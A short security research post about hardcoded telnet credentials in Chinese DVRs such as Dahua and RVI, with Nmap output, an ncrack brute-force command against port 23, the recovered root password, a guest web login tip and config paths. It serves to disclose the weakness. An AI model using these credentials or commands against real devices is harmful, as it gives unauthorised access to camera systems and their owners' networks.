<h1>Hardcoded telnet login\password in Chinese DVR, like Dahua, RVI.</h1>

<br/>Also, it can be rebranded and sell under a different name.
<br/>
<br/>Nmap report looks interesting:
<br/>Nmap scan report for 192.168.100.15
<br/>Host is up (0.0050s latency).
<br/>Not shown: 65527 closed ports
<br/>
<br/>PORT      STATE    SERVICE        VERSION
<br/>
<br/>23/tcp    open     telnet         BusyBox telnetd
<br/>81/tcp    open     http           uc-httpd 1.0.0 #Web-ui, You can get guest access with guest\<empty> credentials
<br/>445/tcp   filtered microsoft-ds
<br/>4090/tcp  open     ssl/omasgport?
<br/>9527/tcp  open     unknown
<br/>9528/tcp  open     unknown
<br/>34567/tcp open     dhanalakshmi? #This port using for remote veiw in CMS
<br/>34599/tcp open     unknown
<br/>
<br/>Device type: WAP
<br/>Running: Linux 2.4.X
<br/>OS CPE: cpe:/o:linux:linux_kernel:2.4.36
<br/>OS details: DD-WRT v24-sp1 (Linux 2.4.36)
<br/>Network Distance: 5 hops
<br/>Service Info: Host: LocalHost
<br/>
<br/>And, with ncrack i "recover" hardcored telnet creds.
<br/>
<br/>ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
<br/>Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
<br/>Discovered credentials for telnet on 192.168.100.15 23/tcp:
<br/>192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
<br/>Ncrack done: 1 service scanned in 27.06 seconds.
<br/>Ncrack finished.
<br/>
<br/>Web-ui configuration files are stored in /mnt/mtd/Config/, but i did not understand password hash in file Account1.
<br/>Also, in my case sed did not work. Empty password hash - tlJwpbo6.
<br/>
<br/>Still work on this.
